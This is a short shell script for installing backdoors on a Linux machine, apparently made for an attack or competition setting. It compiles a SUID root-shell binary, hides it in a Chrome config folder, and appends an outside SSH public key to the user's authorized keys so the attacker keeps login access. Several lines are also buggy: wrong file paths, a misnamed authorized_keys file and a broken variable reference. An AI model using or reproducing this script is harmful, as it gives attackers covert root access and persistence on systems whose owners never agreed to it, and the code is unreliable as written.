 

# Create our backdoor storage area (don't care about being sneaky)
mkdir ~/.config/Chrome >/dev/null 2>/dev/null

# Create SUID File
echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > ~/.config/Chrome/privshell.c
gcc -o ~/.config/Chrome/privshell ~/.config/Chrome/privshell.c
rm ~/.config/Chrome/privshell.c
chown root:root privshell
chmod u+s privshell

# store for later idk
# SSH_PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAElL/Bkr8puF5TmjmQDZdB9Y6IEWh8xmWxILo+lQpp6vu6bAu534BhCOBc4I5ZojZxmIgBp5sWm/1t2/eRwAjrHsNznOu0F/mkjyftEpi76Uka4ctcH7qb3R24k7/sB5Of++dwjllGWqFBeqcfohXQmbqyjhsUC8MS2SWHXoMfB5XuGjjKF8rS/AL0FMbxMZB7DOr6LbXUjPGiJwtIjwh3Wqo5ZLS5rC+gHUGHEdzdZrafDM0xkWw3p6QKPpFemEzg6tO1RjwxOIAnA4uip2hp0R8ufBX4eSYmTtb/rJen3ILXHP6Pr2yciED0zVrggE82tnceSlnfJeEPHHzqe9v" 
 
# add ssh key (from csoc mine vultr)
SSH_PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCSJ6p/PYjx2ND/Uqtx83XtK81AhB1Po6Ere1rpMNeZxbwnJhli5oAlZlnCNE4FHM7jia4EFqdc3B0aidIA1ZNgBa7bHFlss/OzedLKkmThkQvlaMGlcBMQPr7Fq01wNp+hG6Y3JKZHKyGKkGNIj3gyL9dzS0E68oaX5nBmpOeishqltOlftiKTGRffrwgV60DHaP8wt4/DBHiE+8+UZnzwXWVFPwPPSZwoy0nf0iWUXZXfMsNyGiIjcok4sAwlZhQTuW913ANOtQ8+n0ZXn/XPUmGNm/SqRhzUPE70jwQNNAW8Qw0VAvX4Wc9ZViYDfdmR2c0DRcY4G8KgOekYtc9bxOj6ZMRJG5b0UPFEKCc2T2GZswzLus7Vt/lFLQ4R1JRVFYKqkPWcLKUvTGrmAEcAv5CIotfE0CtuDNhSnDULiCObZ0oxvF32DxZs8Mv0trl7Dt5eSfFhdq/YNBWckUw47BnRC5PCIBP2FB9Ugo5g60yMmul0ieq90zzsR2stH40="
SSH_AUTH_KEY_PATH="$(eval cd ~ && pwd)/.ssh/.authorized_keys"

# setup correct perms
chmod 700 "$(eval cd ~ && pwd)/.ssh"
chmod 600 "$(SSH_AUTH_KEY_PATH)"

test=$(egrep -Fx "$SSH_PUB_KEY" "$SSH_AUTH_KEY_PATH" | wc -l | cut -c8)

# not the cleanest, but readable ish??
if [[ -f "$SSH_AUTH_KEY_PATH" ]] && [[ test -eq 0 ]]; then
    echo "$SSH_PUB_KEY" >> "$SSH_AUTH_KEY_PATH"
elif [[ ! -f "$SSH_AUTH_KEY_PATH" ]] ; then
    echo "$SSH_PUB_KEY" > "$SSH_AUTH_KEY_PATH"
fi

cat "$SSH_AUTH_KEY_PATH"